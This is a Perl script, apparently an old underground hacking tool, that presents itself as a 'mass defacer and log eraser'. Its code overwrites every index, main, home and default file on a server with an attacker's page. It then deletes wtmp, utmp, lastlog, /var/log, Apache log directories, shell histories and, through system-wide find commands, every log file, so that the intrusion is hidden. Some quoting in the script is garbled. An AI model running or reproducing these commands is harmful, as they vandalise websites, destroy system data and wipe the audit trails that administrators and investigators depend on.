#########################################################################################################
# MSRml V 0.1 #
# #
# MOROCCO.SECURITY.RULZ mass defacer and log eraser #
# #
# coded by PRI[ll #
# #
# !!!!PRIV8!!!!!PRIV8!!!!!PRIV8!!!!!PRIV8!!!! #
# #
# 05/07/2005 #
# #
# usage : perl MSRml.pl <path to index> #
# #
# example : perl MSRml.pl /tmp/index.html #
# #
# the_r00t3r@hotmail.com #
#########################################################################################################
#!/usr/bin/perl
use strict;
my $index = $ARGV[0];
if ($ARGV[0])
{
if( -e $index )
{
system "echo -e "33[01;34mStarted MSRml V0.1 by PRI[ll Ok !!33[01;37m"n";
system "echo -e "\033[01;37mDefacing all homepages ..."n";
system "find / -name "index*" -exec cp $index {} \;";
system "find / -name "main*" -exec cp $index {} \;";
system "find / -name "home*" -exec cp $index {} \;";
system "find / -name "default*" -exec cp $index {} \;";
system "echo -e "\033[01;37m[+] done ! all sites in this box should be defaced !"n";
system "echo -e "\033[01;37m----------------------------------------------------------"n";
system "echo -e "\033[01;37mCleaning up logs ..."n";
system "echo -e "33[01;34m---------erasing default log files (too fast =))---------33[01;37m"n";
if( -e "/var/log/lastlog" )
{
system 'rm -rf /var/log/lastlog';
system "echo -e "\033[01;37m [*]/var/log/lastlog -erased Ok"n";
}
else
{
system "echo -e "\033[01;31m[*]/var/log/lastlog - No such file or directory\033[01;37m"n";
}
if( -e "/var/log/wtmp" )
{
system 'rm -rf /var/log/wtmp';
system "echo -e "\033[01;37m [*]/var/log/wtmp -erased Ok"n";
}
else
{
system "echo -e "\033[01;31m[*]/var/log/wtmp - No such file or directory\033[01;37m"n";
}
if( -e "/etc/wtmp" )
{
system 'rm -rf /etc/wtmp';
system "echo -e "\033[01;37m [*]/etc/wtmp -erased Ok"n";
}
else
{
system "echo -e "\033[01;31m[*]/etc/wtmp - No such file or directory\033[01;37m"n";
}
if( -e "/var/run/utmp" )
{
system 'rm -rf /var/run/utmp';
system "echo -e "\033[01;37m [*]/var/run/utmp -erased Ok"n";
}
else
{
system "echo -e "\033[01;31m[*]/var/run/utmp - No such file or directory\033[01;37m"n";
}
if( -e "/etc/utmp" )
{
system 'rm -rf /etc/utmp';
system "echo -e "\033[01;37m [*]/etc/utmp -erased Ok"n";
}
else
{
system "echo -e "\033[01;31m[*]/etc/utmp - No such file or directory\033[01;37m"n";
}
if( -e "/var/log" )
{
system 'rm -rf /var/log';
system "echo -e "\033[01;37m [*]/var/log -erased Ok"n";
}
else
{
system "echo -e "\033[01;31m[*]/var/log - No such file or directory\033[01;37m"n";
}
if( -e "/var/logs" )
{
system 'rm -rf /var/logs';
system "echo -e "\033[01;37m [*]/var/logs -erased Ok"n";
}
else
{
system "echo -e "\033[01;31m[*]/var/logs - No such file or directory\033[01;37m"n";
}
if( -e "/var/adm" )
{
system 'rm -rf /var/adm';
system "echo -e "\033[01;37m [*]/var/adm -erased Ok"n";
}
else
{
system "echo -e "\033[01;31m[*]/var/adm - No such file or directory\033[01;37m"n";
}
if( -e "/var/apache/log" )
{
system 'rm -rf /var/apache/log';
system "echo -e "\033[01;37m [*]/var/apache/log -erased Ok"n";
}
else
{
system "echo -e "\033[01;31m[*]/var/apache/log - No such file or directory\033[01;37m"n";
}
if( -e "/var/apache/logs" )
{
system 'rm -rf /var/apache/logs';
system "echo -e "\033[01;37m [*]/var/apache/logs -erased Ok"n";
}
else
{
system "echo -e "\033[01;31m[*]/var/apache/logs - No such file or directory\033[01;37m"n";
}
if( -e "/usr/local/apache/log" )
{
system 'rm -rf /usr/local/apache/log';
system "echo -e "\033[01;37m [*]/usr/local/apache/log -erased Ok"n";
}
else
{
system "echo -e "\033[01;31m[*]/usr/local/apache/log - No such file or directory\033[01;37m"n";
}
if( -e "/usr/local/apache/logs" )
{
system 'rm -rf /usr/local/apache/logs';
system "echo -e "\033[01;37m [*]/usr/local/apache/logs -erased Ok"n";
}
else
{
system "echo -e "\033[01;31m[*]/usr/local/apache/logs - No such file or directory\033[01;37m"n";
}
if( -e "/root/.bash_history" )
{
system 'rm -rf /root/.bash_history';
system "echo -e "\033[01;37m [*]/root/.bash_history -erased Ok"n";
}
else
{
system "echo -e "\033[01;31m[*]/root/.bash_history - No such file or directory\033[01;37m"n";
}
if( -e "/root/.ksh_history" )
{
system 'rm -rf /root/.ksh_history';
system "echo -e "\033[01;37m [*]/root/.ksh_history -erased Ok"n";
}
else
{
system "echo -e "\033[01;31m[*]/root/.ksh_history - No such file or directory\033[01;37m"n";
}
system "echo -e "\033[01;37m[+] -----done all default log and bash_history files erased !!"n";
system "echo -e "33[01;34m---------Now Erasing the rest of the machine log files (can be long :S)---------33[01;37m"n";
system 'find / -name *.bash_history -exec rm -rf {} ;';
system "echo -e "\033[01;37m[*] all *.bash_history files -erased Ok!"n";
system 'find / -name *.bash_logout -exec rm -rf {} ;';
system "echo -e "\033[01;37m[*] all *.bash_logout files -erased Ok!"n";
system 'find / -name "log*" -exec rm -rf {} ;';
system "echo -e "\033[01;37m[*] all log* files -erased Ok!"n";
system 'find / -name *.log -exec rm -rf {} ;';
system "echo -e "\033[01;37m[*] all *.log files -erased Ok!"n";
system "echo -e "33[01;34m-------[+] !done all log files erased![+]-------33[01;37m"n";
system "echo -e "33[01;34m---------------------------------------------------33[01;37m"n";
system "echo -e "33[01;34m-----------------MSRml V 0.1----------------------33[01;37m"n";
}
else
{
system "echo -e "\033[01;31m[-] Failed ! the path to u're index could not be found !\033[01;37m"n";
exit;
}
}
else
{
system "echo -e "\033[01;37m!!Morocco.Security.Rulz mass defacer and log eraser !!"n";
system "echo -e "\033[01;37m!!!!!!!!!!!!!!!!!!coded by PRI[ll!!!!!!!!!!!!!!!!!!!!!!!!"n";
system "echo -e "\033[01;31m!!!!!!!!PRIV8!!!!!!!!PRIV8!!!!!!!!PRIV8!!!!!!!!PRIV8!!!!!!!!\033[01;37m"n";
system "echo -e "\033[01;37musage : perl $0 <path too u're index>"n"; 
system "echo -e "\033[01;37mexample : perl $0 /tmp/index.html"n";
exit;
}